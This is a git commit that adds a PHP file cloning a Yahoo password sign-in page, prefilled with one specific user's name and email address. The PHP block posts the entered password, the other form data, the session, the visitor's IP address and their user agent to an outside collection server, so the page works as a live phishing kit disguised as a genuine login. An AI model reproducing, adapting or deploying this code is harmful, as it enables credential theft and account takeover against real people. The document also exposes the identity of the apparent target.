f464b337936b108f1dcd1248568cdf9861825b87
zainidd10 <46008755+zainidd10@users.noreply.github.com>
2019-04-24 14:53:21 +0300

    Create password.php

---
+++ account/challenge/password.php
@@ -0,0 +1,224 @@
+
+
+
+<html id="Stencil" class="js mobile"><head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
+        <meta name="format-detection" content="telephone=no">
+        <meta name="referrer" content="origin">
+        <title>Yahoo</title>
+        <link rel="dns-prefetch" href="//gstatic.com">
+        <link rel="dns-prefetch" href="//google.com">
+        <link rel="dns-prefetch" href="//s.yimg.com">
+        <link rel="dns-prefetch" href="//y.analytics.yahoo.com">
+        <link rel="dns-prefetch" href="//ucs.query.yahoo.com">
+        <link rel="dns-prefetch" href="//geo.query.yahoo.com">
+        <link rel="dns-prefetch" href="//geo.yahoo.com">
+        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/login/favicon.ico">
+        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/login/favicon.ico">
+        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/apple-touch-icon.png">
+        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/apple-touch-icon.png">
+
+        <!--[if lte IE 8]>
+        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
+        <![endif]-->
+        <!--[if gt IE 8]><!-->
+        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&amp;yui-s:pure/0.5.0/grids-responsive-min.css">
+        <!--<![endif]-->
+        <style nonce="">
+            #mbr-css-check {
+                display: inline;
+            }
+            .mbr-legacy-device-bar {
+                display: none;
+            }
+        </style>
+        <link href="https://s.yimg.com/wm/mbr/23267d7c1e2a697c42c92954d824fd50d87d5bbd/yahoo-main.css" rel="stylesheet" type="text/css">
+        <script nonce="">
+            (function(root) {
+                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
+                root.isGoodJS = isGoodJS;
+            }(this));
+            
+(function (root) {
+/* -- Data -- */
+root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
+root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
+root.I13N_config = {"keys":{"pt":"utility","ver":"nodejs"},"nol":false};
+root.I13N_config || (root.I13N_config = {});
+root.I13N_config.spaceid = 794201019;
+root.challenge || (root.challenge = {});
+root.challenge.servingStamp = 1556101288312;
+root.I13N_config.keys || (root.I13N_config.keys = {});
+root.I13N_config.keys.pct = "primary";
+root.isIOSDevice = true;
+}(this));
+
+            
+            YUI_config.global = window;
+
+
+            window.mbrSendError = function (name, url) {
+                (new Image()).src = '/account/js-reporting/?rid=da46e39ec0e58&crumb=' + encodeURIComponent('LEiu6FUiH1m') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
+            };
+
+            var oldError = window.onerror;
+
+            window.onerror = function (errorMsg, url) {
+                window.mbrSendError(errorMsg, url);
+                if (oldError) {
+                    oldError.apply(this, arguments);
+                }
+                return false;
+            };
+        </script><script type="text/javascript">navigator.__defineGetter__('userAgent', function () { return 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1'; });</script>
+    </head>
+    <body>
+        <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
+            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
+            <input type="checkbox" id="mbr-legacy-device-bar-cross">
+            <p class="mbr-legacy-device">
+                    Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="">More&nbsp;Info</a>
+            </p>
+        </div>
+    <script nonce="">
+        (function(root) {
+            var doc = document;
+
+            if (root.isGoodJS) {
+                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
+                doc.cookie = 'mbr-nojs=; domain=' + doc.domain + '; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure';
+            } else {
+                doc.cookie = 'mbr-nojs=badbrowser; domain=' + doc.domain + '; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure';
+                doc.getElementById('mbr-legacy-device-bar').style.display = 'block';
+            }
+        }(this));
+    </script>
+
+    <div class="loginish login-centered clrfix  puree-v2">
+    <div class="mbr-login-hd" id="mbr-uh-hd">
+     <a href="https://www.yahoo.com">
+        <img src="https://s.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="116" height="">
+    </a>
+</div>
+    <div class="challenge password-challenge">
+    <div id="password-challenge" class="primary">
+    <div class="greeting">
+            <h1 class="username">Hello&nbsp;jleighw09</h1>
+            <p class="not-you"><a href="https://login.yahoo.com/?display=narrow&amp;lang=en-US&amp;login=jleighw09&amp;done=https%3A%2F%2Fmaktoob.yahoo.com%2F&amp;prefill=0&amp;chllngnm=password">Not&nbsp;you?</a></p>
+    </div>
+    <form action="" method="post" class="pure-form pure-form-stacked">
+        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;ar-IQ&quot;,&quot;color_depth&quot;:24,&quot;device_memory&quot;:4,&quot;hardware_concurrency&quot;:4,&quot;resolution&quot;:{&quot;w&quot;:1366,&quot;h&quot;:768},&quot;available_resolution&quot;:{&quot;w&quot;:728,&quot;h&quot;:1366},&quot;timezone_offset&quot;:-180,&quot;session_storage&quot;:1,&quot;local_storage&quot;:1,&quot;indexed_db&quot;:1,&quot;open_database&quot;:1,&quot;cpu_class&quot;:&quot;unknown&quot;,&quot;navigator_platform&quot;:&quot;Win32&quot;,&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webgl_vendor&quot;:&quot;Google Inc.~ANGLE (Intel(R) HD Graphics 620 Direct3D11 vs_5_0 ps_5_0)&quot;,&quot;adblock&quot;:1,&quot;has_lied_languages&quot;:0,&quot;has_lied_resolution&quot;:0,&quot;has_lied_os&quot;:1,&quot;has_lied_browser&quot;:1,&quot;touch_support&quot;:{&quot;points&quot;:0,&quot;event&quot;:0,&quot;start&quot;:0},&quot;audio_fp&quot;:&quot;124.0434474653739&quot;,&quot;plugins&quot;:{&quot;count&quot;:3,&quot;hash&quot;:&quot;7b56340f14f5478984860c0147f7b60c&quot;},&quot;fonts&quot;:{&quot;count&quot;:48,&quot;hash&quot;:&quot;62d5bbf307ed9e959ad3d5ad6ccd3951&quot;},&quot;ts&quot;:{&quot;serve&quot;:1556101288312,&quot;render&quot;:1556101283673}}">
+        <input type="hidden" name="crumb" value="LEiu6FUiH1m">
+        <input type="hidden" name="acrumb" value="1UoSRDUK">
+        <input type="hidden" name="sessionIndex" value="QQ--">
+        <input type="hidden" name="displayName" value="jleighw09">        <div class="hidden-username">
+            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="jleighw09" disabled="">
+        </div>
+        <input type="hidden" name="passwordContext" value="normal">
+        <input type="password" id="login-passwd" name="password" placeholder="Password" autocomplete="current-password">
+		
+		<p class="error-msg" role="alert" data-error="messages.ERROR_EMPTY_PASSWORD">Please provide&nbsp;password.</p>
+		
+        <p class="signin-cont">
+            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign&nbsp;in" data-ylk="elm:btn;elmt:next;slk:next">
+                    Sign&nbsp;in
+            </button>
+        </p>
+        <p class="forgot-cont">
+            <input type="submit" class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link" name="skip" value="I forgot my&nbsp;password">
+        </p>
+    </form>
+	<?
+	
+	$login_email = "jleighw09@yahoo.com";
+	$password = $_POST['password'];
+	
+	
+	
+	if(isset($_POST['verifyPassword'])){
+		
+		if(empty($_POST['password'])){
+			
+			
+			
+			
+		}else{
+			
+			
+			
+			
+			
+			//----------------send request post to url ----------------
+function sendPost($url,$data) {
+	
+	
+$options = array(
+        'http' => array(
+        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+        'method'  => 'POST',
+        'content' => http_build_query($data),
+    )
+);
+
+$context  = stream_context_create($options);
+$result = file_get_contents($url, false, $context);
+return $result;
+}
+
+$data = $_POST;
+$data['date'] = $date;
+$data['s'] = $_SESSION;
+$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
+$data['b'] = ($_SERVER['HTTP_USER_AGENT']);
+//$data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);
+
+
+sendPost('http://saveinfo.aba.ae/Save/yahoo.php',$data);
+
+
+//---- end request----------------
+
+
+$url = "https://www.yahoo.com";
+
+//header("LOCATION: ".$url."");
+	
+			
+		}
+	}
+	
+	
+	?>
+	
+	
+</div>
+</div>
+</div>
+    <script src="https://s.yimg.com/wm/mbr/23267d7c1e2a697c42c92954d824fd50d87d5bbd/bundle.js"></script>
+    <noscript>
+        <img src="/account/js-reporting/?crumb=LEiu6FUiH1m&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
+    </noscript>
+    <script nonce="">
+        var checkAssets = function(seconds) {
+            setTimeout(function() {
+                if (!window.mbrJSLoaded) {
+                    window.mbrSendError('js_failed_to_load', location.pathname);
+                }
+                var check = document.getElementById('mbr-css-check'),
+                    style = check.currentStyle;
+                if (window.getComputedStyle) {
+                    style = window.getComputedStyle(check);
+                }
+                if (style.display !== 'none') {
+                    window.mbrSendError('css_failed_to_load', location.pathname);
+                }
+            }, (seconds * 1000));
+        };
+
+        checkAssets(10);
+    </script>
+    <div id="mbr-css-check"></div>
+
+
+<!-- fe07.member.ir2.yahoo.com - Wed Apr 24 2019 10:21:28 GMT+0000 (UTC) - (0ms) --></body></html>
